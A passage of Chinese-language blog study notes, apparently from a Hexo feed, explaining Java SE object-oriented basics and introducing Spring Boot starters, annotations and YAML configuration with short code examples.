<li>静态变量，<strong>被该类所有对象共享</strong>(用于线程的共用变量时)</li>
<li>静态方法，类名.方法名()，调用时可不用实例化对象</li>
</ul>
<p>​                            <strong>静态方法中，只能调用静态方法和静态变量</strong></p>
<ul>
<li>不能使用this关键字，this随着对象的创建而创建，而static是优先于对象存在的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> age;  <span class="comment">//静态变量</span></span><br><span class="line">p1.age=<span class="number">12</span>;</span><br></pre></td></tr></table></figure>



<h4 id="3、this"><a href="#3、this" class="headerlink" title="3、this"></a>3、this</h4><ul>
<li>构造方法，对<strong>本类对象</strong>的引用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">    <span class="comment">//this关键字表示对当前对象的引用</span></span><br><span class="line">    <span class="keyword">this</span>.name=name;</span><br><span class="line">    <span class="keyword">this</span>.age=age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>普通方法，指向要引用的对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">playGame</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;使用&quot;</span>+<span class="keyword">this</span>.brand+<span class="keyword">this</span>.type+<span class="string">&quot;的手机玩游戏&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用this() 调用本类的构造方法，<strong>必须位于第一句</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Animals</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//调用构造方法</span></span><br><span class="line">    <span class="keyword">this</span>();</span><br><span class="line">    <span class="keyword">this</span>.age=age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>不能使用于静态方法中</li>
</ul>
<h4 id="4、super"><a href="#4、super" class="headerlink" title="4、super"></a>4、super</h4><blockquote>
<p>直接父类的引用，位于方法的第一句</p>
</blockquote>
<ul>
<li>调用本该隐藏的  父类方法  或者  父类成员变量</li>
<li>super() 可调用父类的构造方法 ，<strong>默认调用父类的无参构造方法（调用带参构造则不会默认调用）</strong></li>
<li>多重继承，优先调用<strong>最高父类的</strong>构造方法</li>
</ul>
<h3 id="二、代码块"><a href="#二、代码块" class="headerlink" title="二、代码块"></a>二、代码块</h3><h4 id="1、静态代码块"><a href="#1、静态代码块" class="headerlink" title="1、静态代码块"></a>1、静态代码块</h4><ul>
<li><p>优先于构造代码块，随着类的加载而加载，但<strong>只运行一次</strong></p>
</li>
<li><p>多个静态代码块，顺序执行</p>
</li>
<li><p><strong>只能初始化静态变量</strong></p>
</li>
</ul>
<h4 id="2、构造代码块"><a href="#2、构造代码块" class="headerlink" title="2、构造代码块"></a>2、构造代码块</h4><p>优先于构造方法，可将多个构造方法的相同属性结合在一起</p>
<h4 id="3、局部代码块"><a href="#3、局部代码块" class="headerlink" title="3、局部代码块"></a>3、局部代码块</h4><p>在方法内，限制变量作用域，提高内存的使用率</p>
<h3 id="三、值传递和引用传递"><a href="#三、值传递和引用传递" class="headerlink" title="三、值传递和引用传递"></a>三、值传递和引用传递</h3><h4 id="1-形参和实参"><a href="#1-形参和实参" class="headerlink" title="1.形参和实参"></a>1.形参和实参</h4><p>实际上是俩个不同的存储单元，形式参数用实际参数的值来初始化自己的存储单元内容</p>
<h4 id="2-值传递"><a href="#2-值传递" class="headerlink" title="2.值传递"></a>2.值传递</h4><p>形参是基本数据类型，传递的是值，而传递后实参的值并不会改变</p>
<h4 id="3-引用传递"><a href="#3-引用传递" class="headerlink" title="3.引用传递"></a>3.引用传递</h4><p>形参是引用数据类型，传递的是对象引用（地址），形参和实参指向同一个地址</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">method1</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">    age=age+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">(Person person)</span></span>&#123;</span><br><span class="line">    person.age=person.age+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> age=<span class="number">19</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;传递前&quot;</span>+age);</span><br><span class="line">method1(age);</span><br><span class="line">System.out.println(<span class="string">&quot;传递后&quot;</span>+age);</span><br><span class="line"></span><br><span class="line">Person p=<span class="keyword">new</span> Person();</span><br><span class="line">System.out.println(p.age);</span><br><span class="line">method2(p);     <span class="comment">//传递的是地址</span></span><br><span class="line">System.out.println(p.age);</span><br></pre></td></tr></table></figure>

<h3 id="四、面向对象"><a href="#四、面向对象" class="headerlink" title="四、面向对象"></a>四、面向对象</h3><blockquote>
<p>面向过程：1、踩离合 2、挂挡 3、开车  （C语言）</p>
<p>面向对象：将多种行为封装，调用使用， 例：class 汽车   class 驾驶员 –&gt;驾驶员开汽车</p>
</blockquote>
<ul>
<li>对象：是具体的事物，对象是类的实例 </li>
<li>类：是对 对象的抽象，对一系列方法的封装</li>
</ul>
<p><strong>变量</strong></p>
<ul>
<li><p>全局变量（成员变量）：可不用初始化有默认值，包括基本数据类型和引用数据类型（数组变量、对象变量，对象数组）</p>
</li>
<li><p>局部变量：方法里面声明</p>
</li>
<li><p>实例变量：指的是类的一个实例，是一个对象。<strong>必须在非静态代码块，声明时或在构造器中指定初始化值</strong></p>
</li>
<li><p><strong>类变量</strong>：静态变量，<strong>必须在静态代码块或声明该类变量指定初始化值</strong></p>
<p>成员变量随着对象的消失而消失，堆空间，在创建对象时有初始值， 局部变量随着方法的调用，栈空间，无初始值必须被赋值</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name;</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ss;  <span class="comment">//静态变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//引用数据类型</span></span><br><span class="line">String[] a;      <span class="comment">//数组，引用数据类型</span></span><br><span class="line">Student student;  <span class="comment">//对象变量</span></span><br></pre></td></tr></table></figure>

<h4 id="1、成员方法"><a href="#1、成员方法" class="headerlink" title="1、成员方法"></a>1、成员方法</h4><blockquote>
<p>有参方法、无参方法</p>
<p>格式</p>
<p>修饰符  final static 返回值类型 方法名（参数类型）{</p>
<p>​        方法体；            </p>
<p>​        return;</p>
<p>}</p>
<ul>
<li>修饰符：权限的大小范围</li>
<li>返回值：a. void 无返回值  b.基本数据类型 c.引用数据类型 （对象、Integer）</li>
<li>方法名：第二个单词首字母开始大写</li>
<li>参数类型：无参方法隐含this、super关键字</li>
<li>return:<strong>返回值是方法功能的最终结果</strong>，后面不再有代码</li>
</ul>
</blockquote>
<ul>
<li>有参方法,需要传入参数 </li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String sname)</span></span>&#123;</span><br><span class="line">      System.out.println(sname+<span class="string">&quot;在跑步&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>无参方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(name+<span class="string">&quot;在吃早饭&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<ul>
<li><p><strong>方法不可以嵌套，但可以互相调用</strong></p>
</li>
<li><p>调用形式：直接调用、输出调用、赋值调用、运算调用</p>
</li>
<li><p>重载overload：参数列表不同（<strong>个数、类型、顺序</strong>）</p>
</li>
<li><p>递归：一个方法在方法体内<strong>调用自身</strong>称为递归—&gt;阶乘</p>
</li>
</ul>
<h4 id="2、构造方法"><a href="#2、构造方法" class="headerlink" title="2、构造方法"></a>2、构造方法</h4><blockquote>
<p><strong>常用来初始化对象值，构造该类的实例instance</strong></p>
<p>在创建对象时，默认成员变量为默认值，实际上是无参构造方法起作用</p>
<p>格式</p>
<p>修饰符  类名（）{  </p>
<p>}</p>
</blockquote>
<ul>
<li><p>通过new关键字实例化，后将变量置为默认值null</p>
</li>
<li><p>构造方法名与类名一致，不能有返回值</p>
</li>
<li><p>系统默认定义一个无参构造，若已有有参构造，则没默认调用</p>
</li>
<li><p>可以被重载</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Student s1=<span class="keyword">new</span> Student();</span><br><span class="line">s1.name=<span class="string">&quot;小明&quot;</span>;</span><br><span class="line">s1.eat();  <span class="comment">//调用无参方法</span></span><br><span class="line">s1.run(<span class="string">&quot;小红&quot;</span>);  <span class="comment">//调用带参方法</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造方法,可以被重载</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">    <span class="comment">//this关键字表示对当前对象的引用</span></span><br><span class="line">    <span class="keyword">this</span>.name=name;</span><br><span class="line">    <span class="keyword">this</span>.age=age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3、继承"><a href="#3、继承" class="headerlink" title="3、继承"></a>3、继承</h4><blockquote>
<p>对某一批类的抽象，提高代码的复用性</p>
</blockquote>
<ul>
<li><p>继承父类的所有属性，但不包括父类的构造方法和私有属性（可通过super关键字来调用）</p>
</li>
<li><p>只能实现单继承，不可多继承</p>
</li>
<li><p>继承的子类的修饰符权限应该大于或等于父类的权限修饰符</p>
</li>
</ul>
<h4 id="4、重写"><a href="#4、重写" class="headerlink" title="4、重写"></a>4、重写</h4><p>override子类和父类的方法名相同，但实现的功能不同</p>
<ul>
<li><p>子类的权限修饰符大于或等于父类</p>
</li>
<li><p>重写之后父类方法被隐藏，默认调用子类重写方法</p>
</li>
</ul>
<h4 id="5、封装"><a href="#5、封装" class="headerlink" title="5、封装"></a>5、封装</h4><ul>
<li>用私有封装成员，外界只能通过get、set方法来访问</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String stuName;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getStuName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stuName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStuName</span><span class="params">(String stuName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.stuName = stuName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>也可通过构造方法来初始化对象属性</li>
</ul>
<h4 id="6、多态"><a href="#6、多态" class="headerlink" title="6、多态"></a>6、多态</h4><blockquote>
<p>polymorphism多态：继承、重写、父类引用指向子类对象</p>
<p>好处是<strong>编译时模糊，运行时确定对象</strong></p>
<ul>
<li>一个引用类型的变量可以引用多种实例以及方法可以被重写</li>
</ul>
</blockquote>
<p><strong>形式</strong></p>
<ul>
<li>父类对象作为形式参数</li>
<li>返回值为父类对象</li>
</ul>
<h5 id="6-1-继承实现多态"><a href="#6-1-继承实现多态" class="headerlink" title="6.1 继承实现多态"></a>6.1 继承实现多态</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Vechile</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span>  <span class="keyword">void</span> <span class="title">transport</span><span class="params">()</span></span>;  <span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> <span class="keyword">extends</span> <span class="title">Vechile</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transport</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小轿车运输&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//子类特有方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">speed</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小轿车的速度&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="6-2-接口实现多态"><a href="#6-2-接口实现多态" class="headerlink" title="6.2 接口实现多态"></a>6.2 接口实现多态</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Container</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">getCapacity</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cuboid</span> <span class="keyword">implements</span> <span class="title">Container</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> length;</span><br><span class="line">    <span class="keyword">double</span> width;</span><br><span class="line">    <span class="keyword">double</span> height;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Cuboid</span><span class="params">(<span class="keyword">double</span> length, <span class="keyword">double</span> width, <span class="keyword">double</span> height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.length = length;</span><br><span class="line">        <span class="keyword">this</span>.width = width;</span><br><span class="line">        <span class="keyword">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCapacity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;长方形容积&quot;</span>+length*width*height);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="6-3-向上转型"><a href="#6-3-向上转型" class="headerlink" title="6.3 向上转型"></a>6.3 向上转型</h5><blockquote>
<p>父类引用子类对象，调用子类重写方法</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">drive</span><span class="params">(Vechile vechile)</span></span>&#123;</span><br><span class="line">    System.out.println(name+<span class="string">&quot;在开&quot;</span>);</span><br><span class="line">    vechile.transport();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现类</span></span><br><span class="line">Driver driver=<span class="keyword">new</span> Driver(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">vechile =<span class="keyword">new</span> Car(); <span class="comment">//父类引用指向子类对象</span></span><br><span class="line">driver.drive(vechile); </span><br></pre></td></tr></table></figure>



<h5 id="6-4-向下转型"><a href="#6-4-向下转型" class="headerlink" title="6.4 向下转型"></a>6.4 向下转型</h5><blockquote>
<p>强制转换，父类调用子类特有方法</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">action</span> <span class="params">(Vechile vechile)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(vechile <span class="keyword">instanceof</span> Car)&#123;</span><br><span class="line">        Car car=(Car)vechile;</span><br><span class="line">        car.speed();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(vechile <span class="keyword">instanceof</span> Truck)&#123;</span><br><span class="line">        Truck truck =(Truck)vechile;</span><br><span class="line">        truck.speed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="7、抽象类和接口"><a href="#7、抽象类和接口" class="headerlink" title="7、抽象类和接口"></a>7、抽象类和接口</h4><h5 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h5><ul>
<li>抽象类不能被实例化，只能被继承</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animals</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animals</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>抽象方法只存在于抽象类中，抽象类中的抽象方法只能声明，不能有方法体</li>
</ul>
<p>​        可以定义成员方法（有方法体）</p>
<ul>
<li><p>不能被final修饰</p>
</li>
<li><p>继承抽象类的子类必须实现抽象方法</p>
</li>
</ul>
<h5 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h5><p><strong>实现接口的抽象方法必须要有实现类继承重写接口的抽象方法，匿名实现接口本质上重写了接口的方法</strong></p>
<p>格式：public interface 接口名{   接口体   }</p>
<ul>
<li><p>包含抽象方法、常量：public static final int a=11;</p>
</li>
<li><p>可实现多接口  extends–implements, 接口继承接口 (extends)</p>
</li>
<li><p>实现类必须实现接口的抽象方法</p>
</li>
<li><p>子类也是抽象类时，子类可不用全部实现父类抽象方法</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">double</span> <span class="title">getArea</span><span class="params">(String s)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="8、匿名对象"><a href="#8、匿名对象" class="headerlink" title="8、匿名对象"></a>8、匿名对象</h4><blockquote>
<p>就是没有名字的对象，只能使用一次</p>
</blockquote>
<p><strong>用途</strong></p>
<ul>
<li>对象只有一次调用时，可以使用匿名对象进行简化</li>
<li>作为形参传入</li>
</ul>
<h4 id="9、修饰符"><a href="#9、修饰符" class="headerlink" title="9、修饰符"></a>9、修饰符</h4><ul>
<li><p>private：私有权限，只能在本类使用</p>
</li>
<li><p>default：默认修饰符</p>
</li>
<li><p>protected:    protected可以被子类内部直接访问，而不是new一个父类对象来访问</p>
</li>
<li><p>public :可以被同一个项目其他包其他类使用</p>
</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20200727162138190.png" alt="image-20200727162138190"></p>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20200727162224634.png" alt="image-20200727162224634"></p>
<p><img src="https://csn.damyoung.cn/image-20200727162232107.png" alt="image-20200727162232107"></p>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20200727162239189.png" alt="image-20200727162239189"></p>
<p><img src="https://csn.damyoung.cn/image-20200727162244904.png" alt="image-20200727162244904"></p>
<h4 id="10、对象的比较"><a href="#10、对象的比较" class="headerlink" title="10、对象的比较"></a>10、对象的比较</h4><ul>
<li>运算符==： 比较基本数据类型，比较的是值</li>
</ul>
<p>​                               引用数据类型，比较的是地址</p>
<ul>
<li>equals：比较字符串类型，比较的是值是否相等</li>
</ul>
<p>​                         比较引用数据类型，比较的是地址是否相等</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Student s2=<span class="keyword">new</span> Student();</span><br><span class="line">Student s3=s2;</span><br><span class="line">System.out.println(s1.equals(s3)); </span><br><span class="line"><span class="comment">//引用类型，equals比较的是地址 false</span></span><br></pre></td></tr></table></figure>



<h3 id="五、对象数组"><a href="#五、对象数组" class="headerlink" title="五、对象数组"></a>五、对象数组</h3><blockquote>
<p>当一个对象需要有多个属性，但属性类型不同，即可用对象数组接收</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Mobile</span><span class="params">(String brand, String type, <span class="keyword">int</span> price, String size, <span class="keyword">int</span> pixel)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.brand = brand;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.price = price;</span><br><span class="line">        <span class="keyword">this</span>.size = size;</span><br><span class="line">        <span class="keyword">this</span>.pixel = pixel;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//创建一个一维对象数组</span></span><br><span class="line">Mobile[] mobiles=<span class="keyword">new</span> Mobile[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用构造方法 对 对象数组进行初始化</span></span><br><span class="line">mobiles[<span class="number">0</span>]=<span class="keyword">new</span> Mobile(<span class="string">&quot;苹果&quot;</span>,<span class="string">&quot;is9&quot;</span>,<span class="number">8000</span>,<span class="string">&quot;150*60&quot;</span>,<span class="number">1200</span>);</span><br><span class="line">mobiles[<span class="number">1</span>]=<span class="keyword">new</span> Mobile(<span class="string">&quot;华为&quot;</span>,<span class="string">&quot;note20&quot;</span>,<span class="number">6000</span>,<span class="string">&quot;140*40&quot;</span>,<span class="number">1100</span>);</span><br><span class="line">mobiles[<span class="number">2</span>]=<span class="keyword">new</span> Mobile(<span class="string">&quot;苹果&quot;</span>,<span class="string">&quot;note30&quot;</span>,<span class="number">6000</span>,<span class="string">&quot;140*60&quot;</span>,<span class="number">1500</span>);</span><br><span class="line"><span class="comment">//对象数组调用普通方法</span></span><br><span class="line">mobiles[<span class="number">2</span>].playGame();</span><br></pre></td></tr></table></figure>



<h3 id="六、自动垃圾回收"><a href="#六、自动垃圾回收" class="headerlink" title="六、自动垃圾回收"></a>六、自动垃圾回收</h3><p>自动垃圾回收：有效防止内存泄露</p>
<p>​            没有任何引用变量引用一个对象，这个对象就成了垃圾。</p>
<p>​            1、发现无用信息对象 2、回收被无用信息占用的内存空间</p>
<p>​            手动：System.gc();  需要重写Object类的finalize方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">A a=<span class="keyword">new</span> A();</span><br><span class="line">a=<span class="keyword">null</span>; <span class="comment">//清空地址，使的对象 无引用变量</span></span><br><span class="line">System.gc();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写Object类的finalize方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;该对象被回收&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot</title>
    <url>/2020/11/17/04springboot/</url>
    <content><![CDATA[<h1 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h1><blockquote>
<p>@RestController  restful风格的API，请求和响应都是json</p>
<p><strong>约定大于配置，自动装配</strong></p>
</blockquote>
<p>简化Spring应用开发的一个框架，J2EE开发一站式解决方案</p>
<p>springboot大部分jar包的版本号已经被父模板定义好。</p>
<h2 id="SpringBoot主程序类"><a href="#SpringBoot主程序类" class="headerlink" title="SpringBoot主程序类"></a><strong>SpringBoot主程序类</strong></h2><blockquote>
<p>Spring Boot应用标注在某个类上说明这个类是SpringBoot的主配置类，SpringBoot就应该运行这个类的main方法来启动SpringBoot应用</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201220224527897.png" alt="image-20201220224527897"></p>
<h2 id="Spring-Boot-Maven-plugin"><a href="#Spring-Boot-Maven-plugin" class="headerlink" title="Spring Boot Maven plugin"></a><strong>Spring Boot Maven plugin</strong></h2><blockquote>
<p>能够将Spring Boot应用打包为可执行的jar或war文件，然后以通常的方式运行Spring Boot应用</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201220224755225.png" alt="image-20201220224755225" style="zoom:80%;" />

<h2 id="启动器"><a href="#启动器" class="headerlink" title="启动器"></a><strong>启动器</strong></h2><blockquote>
<p>spring-boot-starter：spring-boot<strong>场景启动器</strong>；</p>
</blockquote>
<p>Spring Boot将所有的功能场景都抽取出来，做成一个个的starters（启动器），只需要在项目里面引入这些starter相关场景的所有依赖都会导入进来。要用什么功能就导入什么场景的启动器</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><p><strong>@SpringBootApplication</strong>：Spring Boot的配置类，标注在某个类上，表示这个一个SpringBoot配置类</p>
<p><strong>@Configuration</strong>：配置类上标注这个注解，配置类也是容器上的一个组件</p>
<p>@<strong>EnableAutoConfiguration</strong>：开启自动配置功能；以前我们需要配置的东西，Spring Boot帮我们自动配置；</p>
<p>post增加 get查询 delete删除 put 修改</p>
<img src="https://csn.damyoung.cn/image-20201118113224374.png" alt="image-20201118113224374" style="zoom:80%;" />

<a id="more"></a>

<h1 id="2、配置文件"><a href="#2、配置文件" class="headerlink" title="2、配置文件"></a>2、配置文件</h1><blockquote>
<p>配置文件的作用：修改SpringBoot自动配置的默认值；SpringBoot在底层都给我们自动配置好</p>
</blockquote>
<p>SpringBoot使用一个全局的配置文件，配置文件名是固定的；</p>
<ul>
<li>application.properties</li>
<li>application.yml</li>
</ul>
<h2 id="YAML语法"><a href="#YAML语法" class="headerlink" title="YAML语法"></a>YAML语法</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8082</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/spring1</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">86795462m</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure>

<p>k:(空格)v：表示一对键值对（空格必须有）；</p>
<p>以<strong>空格</strong>的缩进来控制层级关系；只要是左对齐的一列数据，都是同一个层级的</p>
<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>字符串默认不用加上单引号或者双引号</p>
<ul>
<li>“”：双引号；<strong>不会转义</strong>字符串里面的特殊字符；特殊字符会作为本身想表示的意思</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span>   <span class="string">&quot;zhangsan \n lisi&quot;</span></span><br><span class="line">	<span class="string">//输出；zhangsan</span> <span class="string">换行</span>  <span class="string">lisi</span></span><br></pre></td></tr></table></figure>

<ul>
<li>‘’：单引号；<strong>会转义</strong>特殊字符，特殊字符最终只是一个普通的字符串数据</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span>   <span class="string">‘zhangsan</span> <span class="string">\n</span> <span class="string">lisi’</span></span><br><span class="line">	<span class="string">//输出；zhangsan</span> <span class="string">\n</span>  <span class="string">lisi</span></span><br></pre></td></tr></table></figure>

<h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>k: v：在下一行来写对象的属性和值的关系；注意缩进，对象还是k: v的方式</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">friends:</span></span><br><span class="line">	<span class="attr">lastName:</span> <span class="string">zhangsan</span></span><br><span class="line">	<span class="attr">age:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>行内写法：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">friends:</span> &#123;<span class="attr">lastName:</span> <span class="string">zhangsan</span>,<span class="attr">age:</span> <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>用- 值表示数组中的一个元素</p>
